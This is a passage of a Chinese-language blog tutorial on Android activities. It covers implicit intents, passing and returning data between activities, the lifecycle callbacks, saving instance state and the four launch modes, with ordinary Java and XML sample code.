<p>同时别忘了在<code>&lt;intent-filter&gt;</code>标签中声明该可以响应这个目录：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.ACTION_START"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.MY_CATEGORY"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="更多的隐式用法"><a href="#更多的隐式用法" class="headerlink" title="更多的隐式用法"></a>更多的隐式用法</h3><p>打开网页：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">"http://www.baidu.com"</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中，Intent.ACTION_VIEW是一个Android系统的内置动作，其常量值为android.intent.action.VIEW。然后通过Uri.parse()方法，将一个网址解析成Uri对象，再调用setData()方法把这个Uri对象传递进去。这样点击按钮后就会弹出浏览器了。</p>
<p><code>&lt;intent-filter&gt;</code>标签中可以再配置一个<code>&lt;data&gt;</code>标签，用于更精确地指定当前活动能够响应什么类型的数据。<code>&lt;data&gt;</code>标签中主要可以配置以下内容：</p>
<ul>
<li>android:scheme：用于指定数据的协议部分。</li>
<li>android:host：用于指定数据的主机名部分。</li>
<li>android:port：用于指定数据的端口部分。</li>
<li>android:path：用于指定主机名和端口之后的部分。</li>
<li>android:mimeType：用于指定可以处理的数据类型。</li>
</ul>
<p>只有<code>&lt;data&gt;</code>标签中指定的内容和Intent中携带的Data完全一致时，当前活动才能够响应该Intent。</p>
<p>创建ThirdActivity，并添加上button3。然后修改注册信息：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".ThirdActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.VIEW"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重新编译运行，可以看到系统弹出一个列表（未设置默认程序的话），显示了目前能够响应这个Intent的所有程序。</p>
<p>除了http之外，还可以指定其他很多协议，比如geo的显示地理位置、tel表示拨打电话。</p>
<p>下面调用系统拨号界面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onClick(View v) &#123;</span><br><span class="line">        Intent intent &#x3D; new Intent(Intent.ACTION_DIAL);</span><br><span class="line">        intent.setData(Uri.parse(&quot;tel:10086&quot;));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="向下一个活动传递数据"><a href="#向下一个活动传递数据" class="headerlink" title="向下一个活动传递数据"></a>向下一个活动传递数据</h3><p>在启动活动时传递数据的思路很简单，Intent中提供了一系列putExtr()方法的重载，可以把我们想要传递的数据暂存在Intent中，启动了另一个活动后，只需要把这些数据再从Intent中取出就可以了。</p>
<p>比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        String data = <span class="string">"Hello SecondActivity."</span>;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        intent.putExtra(<span class="string">"extra_data"</span>, data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中extra_data是键，data是值。</p>
<p>然后我们在SecondActivity中将数据取出，并打印出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.second_layout);</span><br><span class="line">    Button button2 = (Button) findViewById(R.id.button_2);</span><br><span class="line">    Intent intent = getIntent();</span><br><span class="line">    String data = intent.getStringExtra(<span class="string">"extra_data"</span>);</span><br><span class="line">    Log.d(<span class="string">"SecondActivity"</span>, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getStringExtra()方法中的String可以切换成相应的数据类型。</p>
<p>这样就可以在Logcat中看到我们发送的信息了。</p>
<h3 id="返回数据给上一个活动"><a href="#返回数据给上一个活动" class="headerlink" title="返回数据给上一个活动"></a>返回数据给上一个活动</h3><p>startActivityForResult()方法也是用于启动活动的，但这个方法期望在活动销毁的时候能够返回一个结果给上一个活动。</p>
<p>startActivityForResult()接收两个参数，第一个参数是Intent，第二个参数是请求码，用于在之后的回调中判断数据的来源。</p>
<p>修改button1如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        startActivityForResult(intent, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>接下来给button2添加返回数据的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(<span class="string">"data_return"</span>, <span class="string">"Hello FirstActivity"</span>);</span><br><span class="line">        setResult(RESULT_OK, intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>setResult()方法用于向上一个活动返回数据。其第一个参数用于向上一个活动返回处理结果，一般只使用RESULT_OK或RESULT_CANCELED这两个值；第二个参数则把带有数据的Intent传递回去。</p>
<p>然后我们需要在FirstActivity中重写onActivityRsult()方法以得到返回数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, Intent data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">if</span>(resultCode == RESULT_OK)&#123;</span><br><span class="line">                String returnedData = data.getStringExtra(<span class="string">"data_return"</span>);</span><br><span class="line">                Log.d(<span class="string">"FirstActivity"</span>, returnedData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>onActivityResult()方法一共有三个参数：第一个参数requestCode是我们启动活动时传入的请求码。第二个参数resultCode，即我们再返回数据时传入的处理结果。第三个参数data，即携带着返回数据的Intent方法。</p>
<p>这样就完成了向上一个活动传递数据的过程。</p>
<p>另外如果是通过按下Back键返回的，我们可以重写onBackPressed方法来解决：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBackPressed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.putExtra(<span class="string">"data_return"</span>, <span class="string">"I back FirstActivity"</span>);</span><br><span class="line">    setResult(RESULT_OK, intent);</span><br><span class="line">    finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="活动的生命周期"><a href="#活动的生命周期" class="headerlink" title="活动的生命周期"></a>活动的生命周期</h2><h3 id="返回栈"><a href="#返回栈" class="headerlink" title="返回栈"></a>返回栈</h3><p>Andorid是使用任务(Task)来管理活动的，一个任务就是一组存放在栈里的活动的集合，这个栈也被称作返回栈。栈是一种后进先出的数据结构，在默认情况下，每当我们启动了一个新的活动，它会在返回栈中入栈，并处于栈顶位置。而每当我们按下Back键或调用finish()方法去销毁一个活动时，处于栈顶的活动就会出栈，这时前一个栈的活动就会重新处于栈顶的位置。系统总是会显示处于栈顶的活动给数据。</p>
<p><img src="./day2/1.png" alt=""></p>
<h3 id="活动状态"><a href="#活动状态" class="headerlink" title="活动状态"></a>活动状态</h3><p>每个活动在其生命周期中最多可能会有4中状态：</p>
<h4 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h4><p>当一个活动位于返回栈的栈顶时，这时活动就处于运动状态。</p>
<h4 id="暂停状态"><a href="#暂停状态" class="headerlink" title="暂停状态"></a>暂停状态</h4><p>当一个活动不再处于栈顶位置，但仍然可见时（比如弹出对话框时他的背景活动仍然是可见的，但它并不是处于栈顶位置），这时活动就进入了暂停状态。只有在内存极低的情况下，系统才会去考虑回收这种活动。</p>
<h4 id="停止状态"><a href="#停止状态" class="headerlink" title="停止状态"></a>停止状态</h4><p>当一个活动不再处于栈顶位置，并且完全不可见的时候，就进入了停止状态。系统仍然会为这种活动保存相应的状态和成员变量，但这并不是完全可靠的。当其他地方需要内存时，处于停止状态的活动会有可能被系统回收。</p>
<h4 id="销毁状态"><a href="#销毁状态" class="headerlink" title="销毁状态"></a>销毁状态</h4><p>当一个活动从返回栈中移除后就变成了销毁状态，系统会最倾向于回收处于这种状态的活动。</p>
<h3 id="活动的生存周期"><a href="#活动的生存周期" class="headerlink" title="活动的生存周期"></a>活动的生存周期</h3><p>Activity类中定义了7个回调方法，覆盖了生命活动周期的每一个环节：</p>
<ul>
<li>onCreate()这个方法会在活动第一次被创建的时候调用。在这个活动中应完成初始化操作，比如加载布局、绑定事件等。</li>
<li>onStart()这个方法在活动由不可见变为可见的时候调用。</li>
<li>onResume()这个方法在活动准备好和用户进行交互的时候调用，此时的活动一定位于返回栈的栈顶，并且处于运行状态。</li>
<li>onPause()这个方法在系统准备去启动或者恢复另一个活动的时候调用，我们通常会在这个方法中将一些消耗CPU资源释放掉，以及保存一些关键数据，但这个方法的执行速度一定要快，不然会影响到新的栈顶活动的使用。</li>
<li>onStop()这个方法在活动完全不可见的时候调用。它和onPause()区别在于如果启动的新活动是一个对话框式的活动，那么onPause()方法会得到执行，而onStop()方法并不会执行。</li>
<li>onDestory()这个方法在活动被销毁之前调用，之后活动的状态将变为销毁状态。</li>
<li>onRestart()这个方法在活动由停止状态变为运行状态之前调用，也就是活动被重新启动了。</li>
</ul>
<p>从而又可以将活动分为3中周期：</p>
<ul>
<li>完整生存期：活动在onCreate()和onDestory()之间所经历的就是完整生存期。一般会在onCreat()中完成各种初始化操作，而在onDestory()中完成释放内存操作。</li>
<li>可见生存期：活动在onStart()和onStop()之间所经历的就是可见生存期。在可见生存期内，活动对于用户总数可见的，即便有可能无法和用户进行交互。我们可以通过这两个方法，合理地管理那些对用户可见的资源。</li>
<li>前台生存期：活动在onResume()和onPause()之间所经历的就是前台生存期。在前台生存期内，活动总是处于运行状态，此时活动是可以喝用户进行交互的。</li>
</ul>
<h3 id="体验活动的生命周期"><a href="#体验活动的生命周期" class="headerlink" title="体验活动的生命周期"></a>体验活动的生命周期</h3><p>新建一个ActivityLifeCycleTest项目，并且运行Android Studio帮我们自动创建活动和布局，勾选Launcher Activity来讲创建的活动设置为主活动，活动名和布局名都使用默认值。</p>
<p>然后新建两个子活动——NormalActivity和DialogActivity，其布局名分别为normal_layout和dialog_layout。</p>
<p>修改normal_layout.xml为如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".NormalActivity"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:text</span>=<span class="string">"This is a normal activity"</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改dialog_layout.xml文件为如下内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".DialogActivity"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:text</span>=<span class="string">"This is a dialog activity"</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>修改AndroidMainFest.xml的<code>&lt;activity&gt;</code>标签：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".DialogActivity"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:theme</span>=<span class="string">"@style/Theme.AppCompat.Dialog"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".NormalActivity"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里@android:stylt/Theme.Dialog是用来指定为对话框式的主体。</p>
<p>接下来修改activity_main.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_normal_activity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start NormalActivity"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_dialog_activity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start DialogActivity"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后，修改MainActivity代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MainACtivity"</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        Button startNormalActivity = (Button) findViewById(R.id.start_normal_activity);</span><br><span class="line">        </span><br><span class="line">        Button startDialogActivity = (Button) findViewById(R.id.start_dialog_activity);</span><br><span class="line">        </span><br><span class="line">        startNormalActivity.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View V)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, NormalActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        startDialogActivity.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View V)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, DialogActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStart();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onStart"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onResume"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onPause"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStop();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onStop"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onDestroy"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onRestart();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onRestart"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行后，便可以体验一遍生命周期了。</p>
<h3 id="活动被回收后"><a href="#活动被回收后" class="headerlink" title="活动被回收后"></a>活动被回收后</h3><p>当A去启动B 后，A被回收了，而B按下back键返回A时，还是会正常显示A，但是这时并不会执行onRestrat()，而是执行onCreate()，因为活动A在这种情况下会被重新创建一次。</p>
<p>但是这种情况下A的临时数据和状态会丢失，Activity提供了onSaveInstanceState()回调方法，这个方法可以保证在活动被回收之前一定会被调用，因此我们可以通过这个方法来解决活动被回收时临时数据得不到保存的问题。</p>
<p>onSaveInstanceState()会携带一个Bundle类型的参数，Bundle提供了一系列的方法保存数据，比如可以用putString()方法保存字符串，putInt保存整型数据等。每个保存方法需要传入两个参数，分别是键和值。</p>
<p>在MainActivity中添加如下代码就可以将临时数据进行保存：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onSaveInstanceState</span><span class="params">(Bundle outState)</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onSaveInstanceState(outState);</span><br><span class="line">    String tempData = <span class="string">"Something you just typed"</span>;</span><br><span class="line">    outState.putString(<span class="string">"data_key"</span>, tempData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，在onCreate中也有一个Bundle类型的参数，该参数在一般情况下为null，但如果在活动被系统回收之前有同过onSaveInstanceState()来保存数据的话，这个参数就会带有之前所保存的全部数据，我们只需要通过相应的取值方法将数据取出即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    Log.d(TAG, &quot;onCreate&quot;);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">	if(savedInstanceState !&#x3D; null)&#123;</span><br><span class="line">		String tempData &#x3D; savedInstanceState.getString(&quot;data_key&quot;);</span><br><span class="line">		Log.d(TAG, tempData);</span><br><span class="line">	&#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="活动的启动模式"><a href="#活动的启动模式" class="headerlink" title="活动的启动模式"></a>活动的启动模式</h2><p>启动模式一共有四种，分别是standard、singleTop、singleTask和singleInstance，可以在<code>&lt;activity&gt;</code>标签指定android:launchMode属性来选择启动模式。</p>
<h3 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h3><p>standard是活动默认的启动模式。在standard模式下，每当启动一个新的活动，它就会在返回栈中入栈，并处于栈顶位置。对于使用standard模式的活动，系统不会在乎这个活动是否已经在返回栈中存在，每次intent启动都会创建该活动的一个新实例。</p>
<h3 id="singleTop"><a href="#singleTop" class="headerlink" title="singleTop"></a>singleTop</h3><p>当活动启动模式指定为singleTop时，在启动活动时如果发现返回栈的栈顶已经是该活动，则认为可以直接使用它，不会再创建新的活动实例。</p>
<h3 id="singleTask"><a href="#singleTask" class="headerlink" title="singleTask"></a>singleTask</h3><p>当活动启动模式指定为singleTask时，每次启动该活动时系统首先会在返回栈中检查是否存在该活动的实例，如果发现已经存在则直接使用该实例，并把在这个活动之上的所有活动统统出栈；如果没有发现则会创建一个新的活动实例</p>
<h3 id="singleInstance"><a href="#singleInstance" class="headerlink" title="singleInstance"></a>singleInstance</h3><p>singleInstance模式的活动会启用一个新的返回栈来管理这个活动（其实如果singleTask模式指定了不同的taskAffinity，也会启动一个新的返回栈）。</p>
<p>在这种模式下，当允许活动被其他程序调用时，就会有一个单独的返回栈来管理这个活动，不管是哪个应用程序来访问这个活动，都共用同一个返回栈，从而实现共享活动实例。</p>
<p><img src="./day2/2.jpg" alt=""></p>
<h2 id="活动的最佳实践"><a href="#活动的最佳实践" class="headerlink" title="活动的最佳实践"></a>活动的最佳实践</h2><h3 id="知晓当前是在哪个活动"><a href="#知晓当前是在哪个活动" class="headerlink" title="知晓当前是在哪个活动"></a>知晓当前是在哪个活动</h3><p>这些选择在ActivityTest项目基础上修改。</p>
<p>首先新建一个BaseActivity类，继承androidx.appcompat.app.AppCompatActivity，然后重写onCreate()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    Log.d(<span class="string">"BaseActivity"</span>, getClass().getSimpleName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后让所有的活动都继承BaseActivity而非AppCompatActivity。这样就可以Logcat中实时知晓当前界面对应哪一个活动了。</p>
<h3 id="随时随地退出程序"><a href="#随时随地退出程序" class="headerlink" title="随时随地退出程序"></a>随时随地退出程序</h3><p>新建一个ActivityCollector类作为活动管理器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityCollector</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> List&lt;Activity&gt; activities = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.add(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.remove(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">finishAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span 